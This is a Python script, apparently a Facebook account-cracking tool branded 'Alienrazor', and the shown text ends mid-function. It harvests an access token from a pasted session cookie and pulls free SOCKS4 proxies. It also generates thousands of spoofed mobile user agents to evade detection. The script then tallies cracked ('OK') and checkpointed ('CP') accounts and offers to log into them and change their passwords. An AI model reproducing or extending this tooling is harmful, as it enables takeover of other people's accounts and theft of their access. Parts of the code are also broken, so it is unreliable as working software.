#Alienrazor 
# 15/2022
lisensiku = "sukses"
import os
try:
    import requests
except ImportError:
    print('\n [×] Module requests not installed yet!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Futures module is not installed yet!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Bs4 module is not installed yet!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
#id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[]
#lisensiku=['sukses']
cokbrut=[]
#pwpluss,pwnya=[],[]
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
#b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
J = '\033[0;33m'
O ='\033[0;33m'
b = '\33[36;1m' #biru keren
m = '\x1b[1;91m' # MERAH
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA YANG 
J = '\033[38;2;255;127;0;1m' # ORANGE
sendy= "[#FF00FF]" # Pink

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERA
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
user = []
tokenku = []
loop = 0
id2 = []
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4.2 Mobile/15E148 Safari/605.1.15 BingWeb/6.54.1.0 iphoneXS BingWeb/6.54.1.0"}
#header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
###########################################################################################
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
###########################################################################################
## RANDOM UA
try:ugenade = open('user.txt','r').read().splitlines()
except:ugenade = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugensendy = open('user2.txt','r').read().splitlines()
except:ugensendy = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4.2 Mobile/15E148 Safari/605.1.15 BingWeb/6.54.1.0 iphoneXS BingWeb/6.54.1.0"
#uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
#uas_random = random.choice(["Mozilla/5.0 (Linux; Android 13; en-us; PixelBuild/QP1A.191005.007.A3; wv) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/85.0.4785.121 Mobile Safari/537.36 Instagram180.0.0.31.119 Android (29/10; 420dpi; 1080x1794; Google/google;Pixel; sailfish; sailfish; en_US; 385416228)""Mozilla/5.0 (Linux; Android 8.1.0;  en-us; I1927 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.4562.135 Mobile Safari/537.36 Instagram 180.0.0.31.119 Android (30/11; 480dpi; 1080x2310; vivo/iQOO; I1927; I1928; qcom; e","Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-M235M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4684.40 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
# lempankkkkkkkk
ugen2=[]
ugen=[]
redmi = []
def cocok():
	try:
		cokbru=open('.cookie.txt').read()
		cokbrut.append(cokbru)
	except:
		login_lagi334()
# COLORS
"""
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
"""
for x in range(1000):
	rr = random.randint
	rc = random.choice
	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	se = f'{A}{B}{C}{D}'
	if se in redmi:pass
	else:redmi.append(se)
#abcd = open('.proxy.txt','r').read().splitlines()
def clear():
	os.system('clear')
# BACK
def back():
	login()#
# BANNER

	
# VALIDASI TOKEN
def login():
	if 'sukses' in lisensiku:
#		uaku()
		cocok()
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				time.sleep(1.5)
				#loading()
				
			
				mochko()
				
				#menu(sy2,sy3)
			except KeyError:
				login_lagi334()
			except requests.exceptions.ConnectionError:
				
				print("[×] Internet Error")
				exit()
		except IOError:
			login_lagi334()
	
##----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))			
								
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Delete Cookies
    try:os.remove('.cookie.txt')
    except:pass
    # Delete Token
    try:os.remove('login.txt')
    except:pass
			
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass


	
def login_lagi334():
    os.system("clear")    
    mkdir_data_login()
    logo()
    cookie=input(f"\n{P}Cookies : {P}")
   # loading()
    #time.sleep(0.5)
    
    #print(f"\n{H}[✓] LOGIN BERHASIL {P}")
    try:
        token = clotox(cookie)      
        coki = {'cookie':cookie}
       
        open('.token.txt', 'w').write(token)
        
        open('.cookie.txt','w').write(cookie)
	#print(f"\n{H}[✓] LOGIN BERHASIL {P}")        
    #print(f"\n{H}[✓] LOGIN BERHASIL {P}")
        
         
   # tes3 = json.loads(req.text)['id']
   # print("\n[✓] Login Berhasil")
        #menu(my_name,my_id)
        login()
        #mochko()
        exit()
      
        
    except requests.exceptions.ConnectionError:print(f"{P}[•] No Internet Connection ");exit()
    except (KeyError,IOError,AttributeError):print(f"{P}[•] Cookies Invalid ");time.sleep(2);login()
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    #prox = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
    #prox = requests.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies-https.txt').text
    #prox = requests.get('https://raw.githubusercontent.com/Sendy-Ft/Dcmbf/main/Poos.txt?token=GHSAT0AAAAAABWS5HSOYKJXKULQZPASVNI2YWPTVXQ').text
    
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     
def mentod():
    print('%s══════════════════════════════════════════\n %sMETHOD MENU%s'%(N,BM,N))
    print(' %s[%s1%s] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
    print(' [%s2%s] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
    print(' [%s3%s] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{O}•{N}] {O}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
# LOGO
def logo():
    print(f"""{M}
                                                              
                      ::             .^:                    
                    5#~               .Y&J                  
                .: &@^                  5@# !               
                &P:@@                   ~@@~@J              
                &@&@@G       ....~     .&@@@@Y              
              .?~&@@@G     !P@@@@7      @@@@G~J             
               ?&#@@@P^.     !@@&     ^^&@@&&&^             
                .5#&@@GBPJ!:.Y@@@?^?YGG#@@&B?               
                 !B&&@@@@@@@@@@@@@@@@@@@@&#G:               
                  :P&@@&@@@@@@@@@@@@@&&@@B7                 
                     .~!:^G@&@@@@@@J:~!:                    
                       ^?P5:.@@@G !P5!.                     
                        :.  G@@@@!  :.                      
                           J@&@&@@^                         
                          :&&B&#&##                         
                          :Y#G&#&Y5                         
                            Y5@#B:                          
                            ^J@#Y                           
                             ~@#^                           
                             .@#                            
                              &B                            
                              &G                            
                              #5                            
                              G?                            
                              :.                            
                                                            
                                   {N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{O}•{P}] Author    :   Sajjad            {N}║")
    print(f"║{P}[{O}•{P}] Github    :   SHAHZADA-AHMED          {N}  ║")
    print(f"║{P}[{O}•{P}] Status    :   {O}SUPREME{P}               {N}║")
    print(f"║{P}[{O}•{P}] Support   :   64bit                 {N}║")
    print(f"║{P}[{O}•{P}] Network   :   {O}SAJJAD-SATELLITE{N}, {O}G3{N}        ║")
    print("╚════════════════════════════════════════╝")
#CRACK DONE
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY ALIENRAZOR DONE...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(N,H,N,H,str(len(ok)),N))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(K,N,K,str(len(cp)),N))
        cek_cp = input(f"{N}══════════════════════════════════════════\n [{K}?{N}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(1)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}admin123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Alien-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[Alien-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit
            #a = input('[••] Tekan Enter');login
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python run.py{N}'");exit()
           # a = input('[••] Tekan Enter');login
            
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()
#LOGIN SC
user = "meta"
pwas = "metaroyid"
def cek_pw():
    try:
        open(".ini_pw.txt", "r").read()
    except FileNotFoundError:
        os.system("clear")
        logo()
        print(' [%s!%s] Pilih nomer 2 jika ada yang memperjual\n belikan SC META. SC ini %sGRATIS%s'%(M,N,H,N))
        print('\n %s%sOPTION MENU%s'%(BM,P,N))
        print(' [%s1%s] Already have SC Login Info'%(H,N))
        print(' [%s2%s] Send a message to the Author'%(H,N))
        pil = input('\n %s[%s?%s] Choice : '%(N,K,N))
        if pil =="":
            jalan(f" {N}[{M}×{N}] Sorry, it is wrong...!");time.sleep(1);cek_pw()
        elif pil in["2","02"]:
            jalan("\n %s[%s•%s] %sYou will be redirected to the Author Whatsapp..."%(N,H,N,H));time.sleep(0.02)
